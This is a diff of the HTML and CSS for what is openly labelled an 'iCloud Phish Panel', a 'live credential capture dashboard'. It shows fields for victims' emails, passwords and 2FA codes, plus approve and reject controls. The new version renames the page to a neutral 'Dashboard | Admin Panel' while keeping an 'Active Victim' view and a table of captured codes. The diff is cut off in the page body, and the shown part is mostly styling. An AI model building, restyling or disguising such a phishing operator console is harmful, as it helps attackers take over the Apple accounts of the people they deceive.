@@ -3,1170 +3,924 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud Phish Panel</title>
+    <title>Dashboard | Admin Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
         :root {
-            --glass-bg: rgba(30, 30, 30, 0.7);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --accent-green: #00ff88;
-            --accent-orange: #ff9f0a;
-            --accent-blue: #2997ff;
-            --accent-red: #ff3b30;
-            --text-primary: #fff;
-            --text-secondary: #888;
-            --bg-dark: #0a0a0a;
-            --card-bg: #161616;
+            --primary: #6366f1;
+            --primary-light: #818cf8;
+            --primary-dark: #4f46e5;
+            --bg: #f8fafc;
+            --surface: #ffffff;
+            --surface-hover: #f1f5f9;
+            --border: #e2e8f0;
+            --text: #1e293b;
+            --text-secondary: #64748b;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --shadow: 0 1px 3px rgba(0,0,0,0.1), 0 1px 2px rgba(0,0,0,0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
         }
         
         body {
-            background: var(--bg-dark);
-            color: var(--text-primary);
-            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
             min-height: 100vh;
-            padding: 24px;
-            background-image: 
-                radial-gradient(ellipse at 20% 0%, rgba(0, 255, 136, 0.08) 0%, transparent 50%),
-                radial-gradient(ellipse at 80% 100%, rgba(41, 151, 255, 0.08) 0%, transparent 50%);
-        }
-        
-        .header {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 32px;
-            padding-bottom: 24px;
-            padding: 20px 24px;
-            border-bottom: 1px solid var(--glass-border);
-            background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, transparent 100%);
-            border-radius: 20px;
-            border: 1px solid var(--glass-border);
         }
         
-        .header-left {
+        .sidebar {
+            width: 260px;
+            background: var(--surface);
+            border-right: 1px solid var(--border);
             display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-        
-        .logo {
-            width: 48px;
-            height: 48px;
-            background: linear-gradient(135deg, var(--accent-green), #00aa55);
-            border-radius: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            box-shadow: 0 8px 32px rgba(0, 255, 136, 0.3);
-        }
-        
-        .header h1 {
-            font-size: 28px;
-            font-weight: 600;
-            background: linear-gradient(135deg, #fff 0%, #888 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .header-subtitle {
-            color: var(--text-secondary);
-            font-size: 14px;
-            margin-top: 4px;
-        }
-        
-        .header-right {
-            display: flex;
-            gap: 12px;
-            align-items: center;
-        }
-        
-        .refresh-select {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 8px;
-            color: var(--text-primary);
-            padding: 8px 12px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-        
-        .action-btn {
-            width: 40px;
-            height: 40px;
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 10px;
-            font-size: 18px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .action-btn:hover {
-            background: rgba(255,255,255,0.1);
-            transform: scale(1.05);
-        }
-        
-        .connection-status {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #ff3b30;
-            box-shadow: 0 0 10px #ff3b30;
-        }
-        
-        .connection-status.connected {
-            background: #00ff88;
-            box-shadow: 0 0 10px #00ff88;
-        }
-        
-        .search-bar {
-            width: 100%;
-            max-width: 400px;
-            padding: 12px 16px;
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 12px;
-            color: var(--text-primary);
-            font-size: 14px;
-            margin-bottom: 16px;
-        }
-        
-        .search-bar::placeholder { color: var(--text-secondary); }
-        
-        .time-ago {
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
-        
-        .copy-value { cursor: pointer; }
-        .copy-value:active { transform: scale(0.95); }
-        
-        .auto-approve-toggle {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 14px;
-        }
-        
-        .auto-approve-toggle input { width: 18px; height: 18px; }
-        
-        .victim-timeline {
-            display: flex;
-            gap: 16px;
-            margin-bottom: 16px;
-            flex-wrap: wrap;
-        }
-        
-        .timeline-step {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 8px 12px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 8px;
-            font-size: 13px;
-        }
-        
-        .timeline-step.active { background: rgba(0, 255, 136, 0.2); color: var(--accent-green); }
-        
-        .stats-chart {
-            height: 120px;
-            display: flex;
-            align-items: flex-end;
-            gap: 4px;
-            padding: 16px;
-            background: var(--glass-bg);
-            border-radius: 12px;
-            margin-bottom: 16px;
-        }
-        
-        .chart-bar {
-            flex: 1;
-            background: var(--accent-green);
-            border-radius: 4px 4px 0 0;
-            min-height: 4px;
-            opacity: 0.7;
-        }
-        
-        .glass-panel { transition: none; }
-        
-        .theme-toggle {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 8px;
-            padding: 8px 12px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        
-        body.light-mode {
-            --bg-dark: #f5f5f7;
-            --glass-bg: rgba(255, 255, 255, 0.8);
-            --glass-border: rgba(0, 0, 0, 0.1);
-            --text-primary: #1d1d1f;
-            --text-secondary: #86868b;
-            --card-bg: #fff;
-        }
-        
-        body.light-mode .glass-panel { background: rgba(255,255,255,0.9); }
-        
-        @media (max-width: 768px) {
-            .header { flex-direction: column; gap: 16px; }
-            .header-right { flex-wrap: wrap; justify-content: center; }
-            .stats-grid { grid-template-columns: 1fr 1fr; }
-            .main-grid { grid-template-columns: 1fr; }
-        }
-        
-        .settings-btn {
-            width: 44px;
-            height: 44px;
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            color: var(--text-secondary);
-            font-size: 20px;
-        }
-        
-        .settings-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: scale(1.05);
-        }
-        
-        .live-badge {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 10px 20px;
-            background: rgba(0, 255, 136, 0.15);
-            border: 1px solid rgba(0, 255, 136, 0.4);
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
-        }
-        
-        .live-dot {
-            width: 10px;
-            height: 10px;
-            background: var(--accent-green);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-            box-shadow: 0 0 10px var(--accent-green);
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(0.9); }
-        }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 16px;
-            margin-bottom: 32px;
-        }
-        
-        .stat-card {
-            background: linear-gradient(135deg, var(--glass-bg), rgba(255,255,255,0.05));
-            border: 1px solid var(--glass-border);
-            border-radius: 16px;
-            padding: 24px;
-            backdrop-filter: blur(20px);
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
-        }
-        
-        .stat-card:hover {
-            transform: translateY(-4px) scale(1.02);
-            border-color: rgba(255, 255, 255, 0.3);
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.4), 0 0 20px rgba(0, 255, 136, 0.1);
-        }
-        
-        .stat-card .num {
-            font-size: 36px;
-            font-weight: 700;
-            background: linear-gradient(135deg, var(--accent-green), #00dd77);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
-        }
-        
-        .stat-card .label {
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-top: 8px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .main-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 32px;
-            margin-bottom: 32px;
-        }
-        
-        .victim-card {
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 20px rgba(0, 255, 136, 0.1);
-            border: 1px solid rgba(0, 255, 136, 0.3);
-        }
-        
-        .victim-card.twofa {
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 20px rgba(255, 159, 10, 0.2);
-            border: 1px solid rgba(255, 159, 10, 0.4);
-        }
-        
-        .victim-card.rejected {
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 20px rgba(255, 59, 48, 0.2);
-            border: 1px solid rgba(255, 59, 48, 0.4);
-        }
-        
-        .glass-panel {
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.3);
-            border: 1px solid var(--glass-border);
-            padding: 32px;
-            margin-bottom: 24px;
-            border-radius: 24px;
-        }
-        
-        .quick-toolbar {
+            flex-direction: column;
             position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(180deg, transparent, rgba(0,0,0,0.9));
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            gap: 16px;
+            height: 100vh;
             z-index: 100;
         }
         
-        .quick-toolbar .btn {
-            padding: 14px 32px;
-            font-size: 16px;
-            border-radius: 30px;
+        .sidebar-header {
+            padding: 24px;
+            border-bottom: 1px solid var(--border);
         }
         
-        .btn-approve { background: linear-gradient(135deg, var(--accent-green), #00cc6a); }
-        .btn-reject { background: linear-gradient(135deg, var(--accent-red), #cc3028); }
-        
-        .pie-chart-container {
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--primary);
             display: flex;
             align-items: center;
-            gap: 20px;
-            padding: 16px;
-            background: var(--glass-bg);
-            border-radius: 16px;
-            margin-bottom: 20px;
+            gap: 10px;
         }
         
-        .pie-legend {
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            border-radius: 10px;
             display: flex;
-            gap: 16px;
-            font-size: 13px;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
         }
         
-        .pie-legend span { display: flex; align-items: center; gap: 6px; }
+        .nav-menu {
+            flex: 1;
+            padding: 16px 12px;
+            overflow-y: auto;
+        }
         
-        * { border-radius: 12px; }
+        .nav-section {
+            margin-bottom: 24px;
+        }
+        
+        .nav-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            padding: 0 12px;
+            margin-bottom: 8px;
+        }
+        
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            color: var(--text-secondary);
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        
+        .nav-item:hover {
+            background: var(--surface-hover);
+            color: var(--text);
+        }
+        
+        .nav-item.active {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
+        }
+        
+        .nav-item .icon {
+            font-size: 18px;
+            width: 20px;
+            text-align: center;
+        }
+        
+        .nav-item .badge {
+            margin-left: auto;
+            background: var(--danger);
+            color: white;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 600;
+        }
+        
+        .sidebar-footer {
+            padding: 16px;
+            border-top: 1px solid var(--border);
+        }
+        
+        .upgrade-card {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            border-radius: 12px;
+            padding: 16px;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+        
+        .upgrade-card:hover {
+            transform: translateY(-2px);
+        }
+        
+        .upgrade-card h4 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .upgrade-card p {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .main-content {
+            flex: 1;
+            margin-left: 260px;
+            min-height: 100vh;
+        }
+        
+        .top-bar {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        
+        .page-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text);
+        }
+        
+        .top-bar-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        
+        .search-bar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--surface-hover);
+            padding: 10px 16px;
+            border-radius: 10px;
+            width: 300px;
+        }
+        
+        .search-bar input {
+            border: none;
+            background: none;
+            outline: none;
+            font-size: 14px;
+            width: 100%;
+            color: var(--text);
+        }
+        
+        .search-bar input::placeholder {
+            color: var(--text-secondary);
+        }
+        
+        .icon-btn {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            border: none;
+            background: var(--surface-hover);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            color: var(--text-secondary);
+            transition: all 0.2s ease;
+        }
+        
+        .icon-btn:hover {
+            background: var(--border);
+            color: var(--text);
+        }
+        
+        .user-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .dashboard-content {
+            padding: 32px;
+        }
         
         .stats-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            gap: 20px;
+            gap: 24px;
             margin-bottom: 32px;
         }
         
-        @media (max-width: 900px) {
-            .main-grid { grid-template-columns: 1fr; }
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
-        }
-        
-        .glass-panel {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 20px;
-            padding: 24px;
-            backdrop-filter: blur(20px);
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .panel-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .panel-title {
-            font-size: 15px;
-            font-weight: 700;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 20px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .panel-title span {
-            font-size: 20px;
-        }
-        
-        .victim-card {
-            background: linear-gradient(135deg, rgba(0, 255, 136, 0.15), rgba(0, 255, 136, 0.05));
-            border: 2px solid rgba(0, 255, 136, 0.5);
-            border-radius: 20px;
-            padding: 32px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4), 0 0 30px rgba(0, 255, 136, 0.15);
+        .stat-card {
+            background: var(--surface);
             border-radius: 16px;
-            padding: 20px;
-            animation: slideIn 0.3s ease;
-        }
-        
-        @keyframes slideIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        
-        .victim-card.twofa {
-            background: linear-gradient(135deg, rgba(41, 151, 255, 0.15), rgba(41, 151, 255, 0.05));
-            border-color: var(--accent-blue);
-        }
-        
-        .victim-info {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-        
-        .field-box {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 12px;
-        }
-        
-        .field-label {
-            font-size: 10px;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 6px;
-        }
-        
-        .field-value {
-            font-size: 15px;
-            font-weight: 500;
-            font-family: 'SF Mono', monospace;
-        }
-        
-        .field-value.email { color: var(--accent-blue); }
-        .field-value.password { color: var(--accent-orange); }
-        
-        .btn-row {
-            display: flex;
-            gap: 10px;
-        }
-        
-        .btn {
-            flex: 1;
-            padding: 14px 20px;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
+            padding: 24px;
+            box-shadow: var(--shadow);
             transition: all 0.3s ease;
+            border: 1px solid var(--border);
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .stat-card.featured {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+        }
+        
+        .stat-card.featured .stat-label,
+        .stat-card.featured .stat-icon {
+            color: rgba(255,255,255,0.8);
+        }
+        
+        .stat-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 16px;
+        }
+        
+        .stat-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 22px;
+        }
+        
+        .stat-icon.green {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+        }
+        
+        .stat-icon.orange {
+            background: rgba(245, 158, 11, 0.1);
+            color: var(--warning);
+        }
+        
+        .stat-icon.blue {
+            background: rgba(99, 102, 241, 0.1);
+            color: var(--primary);
+        }
+        
+        .stat-icon.red {
+            background: rgba(239, 68, 68, 0.1);
+            color: var(--danger);
+        }
+        
+        .stat-value {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        
+        .charts-section {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+        
+        .chart-card {
+            background: var(--surface);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+        }
+        
+        .card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+        
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .card-subtitle {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-top: 4px;
+        }
+        
+        .chart-placeholder {
+            height: 200px;
+            display: flex;
+            align-items: flex-end;
             gap: 8px;
+            padding: 20px 0;
         }
         
-        .btn-approve {
-            background: linear-gradient(135deg, var(--accent-green), #00aa55);
-            color: #000;
-            box-shadow: 0 4px 20px rgba(0, 255, 136, 0.3);
+        .chart-bar {
+            flex: 1;
+            background: linear-gradient(180deg, var(--primary), var(--primary-light));
+            border-radius: 6px 6px 0 0;
+            transition: all 0.3s ease;
+            min-height: 20px;
         }
         
-        .btn-approve:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(0, 255, 136, 0.4);
+        .chart-bar:hover {
+            background: var(--primary-dark);
         }
         
-        .btn-reject {
-            background: rgba(255, 59, 48, 0.2);
-            color: var(--accent-red);
-            border: 1px solid rgba(255, 59, 48, 0.3);
+        .pie-chart {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            background: conic-gradient(var(--success) 0deg 200deg, var(--danger) 200deg 360deg);
+            margin: 0 auto;
+            position: relative;
         }
         
-        .btn-reject:hover {
-            background: rgba(255, 59, 48, 0.3);
-            transform: translateY(-2px);
+        .pie-center {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100px;
+            height: 100px;
+            background: var(--surface);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+        }
+        
+        .pie-legend {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .legend-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+        
+        .legend-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+        }
+        
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 24px;
+        }
+        
+        .tool-card {
+            background: var(--surface);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .tool-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+            border-color: var(--primary);
+        }
+        
+        .tool-icon {
+            width: 56px;
+            height: 56px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-bottom: 16px;
+        }
+        
+        .tool-icon.active {
+            background: linear-gradient(135deg, var(--success), #059669);
+            color: white;
+        }
+        
+        .tool-icon.pending {
+            background: linear-gradient(135deg, var(--warning), #d97706);
+            color: white;
+        }
+        
+        .tool-icon.idle {
+            background: linear-gradient(135deg, #94a3b8, #64748b);
+            color: white;
+        }
+        
+        .tool-name {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .tool-desc {
+            font-size: 13px;
+            color: var(--text-secondary);
+            margin-bottom: 16px;
+            line-height: 1.5;
+        }
+        
+        .tool-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .tool-status.active {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+        }
+        
+        .tool-status.pending {
+            background: rgba(245, 158, 11, 0.1);
+            color: var(--warning);
+        }
+        
+        .tool-status.idle {
+            background: rgba(100, 116, 139, 0.1);
+            color: var(--text-secondary);
+        }
+        
+        .data-table {
+            background: var(--surface);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border);
+        }
+        
+        .table-header {
+            padding: 20px 24px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .table-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th {
+            text-align: left;
+            padding: 16px 24px;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            background: var(--surface-hover);
+        }
+        
+        td {
+            padding: 16px 24px;
+            font-size: 14px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        tr:hover td {
+            background: var(--surface-hover);
+        }
+        
+        .email-cell {
+            font-weight: 500;
+            color: var(--text);
+        }
+        
+        .code-cell {
+            font-family: monospace;
+            background: var(--surface-hover);
+            padding: 4px 8px;
+            border-radius: 6px;
+            font-size: 13px;
+        }
+        
+        .time-cell {
+            color: var(--text-secondary);
+        }
+        
+        .action-btn {
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: none;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .action-btn.copy {
+            background: var(--surface-hover);
+            color: var(--text);
+        }
+        
+        .action-btn.copy:hover {
+            background: var(--border);
         }
         
         .empty-state {
             text-align: center;
-            padding: 40px;
+            padding: 60px 20px;
             color: var(--text-secondary);
         }
         
         .empty-icon {
-            font-size: 40px;
+            font-size: 48px;
             margin-bottom: 16px;
-            opacity: 0.3;
+            opacity: 0.5;
         }
         
-        .capture-list {
-            max-height: 400px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-        
-        .capture-list::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        .capture-list::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 3px;
-        }
-        
-        .capture-list::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 3px;
-        }
-        
-        .capture-item {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 12px;
-            padding: 18px;
-            border-left: 4px solid var(--accent-green);
-            transition: all 0.2s ease;
-            animation: fadeIn 0.3s ease;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-        }
-        
-        .capture-item:hover {
-            background: rgba(255, 255, 255, 0.05);
-            transform: translateX(4px);
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.3);
-        }
-        
-        .capture-item.twofa { 
-            border-left-color: var(--accent-orange); 
-            box-shadow: 0 2px 8px rgba(255, 159, 10, 0.1);
-        }
-        .capture-item.resend { border-left-color: var(--accent-blue); }
-        
-        .capture-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-        
-        .capture-row:last-child { margin-bottom: 0; }
-        
-        .capture-label {
-            font-size: 11px;
-            color: var(--text-secondary);
-            text-transform: uppercase;
-        }
-        
-        .capture-value {
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .capture-value.email { color: var(--accent-blue); }
-        .capture-value.code { 
-            color: var(--accent-orange); 
-            font-family: 'SF Mono', monospace;
-            letter-spacing: 2px;
-            font-size: 16px;
-        }
-        
-        .capture-time {
-            font-size: 12px;
-            color: var(--text-secondary);
-        }
-        
-        .settings-modal {
-            display: none;
+        .quick-actions {
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            z-index: 1000;
-            align-items: center;
-            justify-content: center;
-            animation: fadeIn 0.2s ease;
-        }
-        
-        .settings-modal.active { display: flex; }
-        
-        .settings-content {
-            background: var(--card-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 24px;
-            padding: 32px;
-            width: 90%;
-            max-width: 500px;
-            animation: slideUp 0.3s ease;
-        }
-        
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .settings-title {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 24px;
+            bottom: 24px;
+            right: 24px;
             display: flex;
-            align-items: center;
             gap: 12px;
         }
         
-        .settings-option {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 0;
-            border-bottom: 1px solid var(--glass-border);
-        }
-        
-        .settings-option:last-child { border-bottom: none; }
-        
-        .settings-label {
-            font-size: 15px;
-        }
-        
-        .toggle {
-            width: 50px;
-            height: 28px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 14px;
-            position: relative;
+        .quick-btn {
+            padding: 14px 24px;
+            border-radius: 12px;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+            box-shadow: var(--shadow-lg);
         }
         
-        .toggle.active {
-            background: var(--accent-green);
+        .quick-btn.approve {
+            background: var(--success);
+            color: white;
         }
         
-        .toggle::after {
-            content: '';
-            position: absolute;
-            width: 22px;
-            height: 22px;
-            background: #fff;
-            border-radius: 50%;
-            top: 3px;
-            left: 3px;
-            transition: all 0.3s ease;
+        .quick-btn.reject {
+            background: var(--danger);
+            color: white;
         }
         
-        .toggle.active::after {
-            left: 25px;
+        .quick-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        @media (max-width: 1200px) {
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .charts-section { grid-template-columns: 1fr; }
+            .tools-grid { grid-template-columns: repeat(2, 1fr); }
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar { display: none; }
+            .main-content { margin-left: 0; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .tools-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <div class="header-left">
-            <div class="logo">☁️</div>
-            <div>
-                <h1>iCloud Phish Panel</h1>
-                <div class="header-subtitle">Live credential capture dashboard</div>
+    <div class="sidebar">
+        <div class="sidebar-header">
+            <div class="logo">
+                <div class="logo-icon">☁️</div>
+                Dashboard
             </div>
         </div>
-        <div class="header-right">
-            <button class="theme-toggle" onclick="toggleTheme()">🌙</button>
-            <label class="auto-approve-toggle">
-                <input type="checkbox" id="autoApprove" onchange="toggleAutoApprove()">
-                Auto-approve
-            </label>
-            <select id="refreshRate" class="refresh-select" onchange="updateRefreshRate()">
-                <option value="1000">1s</option>
-                <option value="1500" selected>1.5s</option>
-                <option value="2000">2s</option>
-                <option value="5000">5s</option>
-            </select>
-            <button class="action-btn" onclick="exportDataCSV()" title="Export CSV">📊</button>
-            <button class="action-btn" onclick="exportData()" title="Export JSON">📥</button>
-            <button class="action-btn" onclick="clearData()" title="Clear Data">🗑️</button>
-            <div class="connection-status" id="connectionStatus">●</div>
-            <div class="live-badge">
-                <div class="live-dot"></div>
-                LIVE
+        
+        <div class="nav-menu">
+            <div class="nav-section">
+                <div class="nav-label">Overview</div>
+                <div class="nav-item active">
+                    <span class="icon">📊</span>
+                    Dashboard
+                </div>
+                <div class="nav-item">
+                    <span class="icon">📈</span>
+                    Analytics
+                </div>
+                <div class="nav-item">
+                    <span class="icon">🔧</span>
+                    Active Victim
+                    <span class="badge" id="active-badge">0</span>
+                </div>
             </div>
-            <button class="settings-btn" onclick="toggleSettings()">⚙️</button>
-        </div>
-    </div>
-    
-    <div class="stats-chart" id="statsChart">
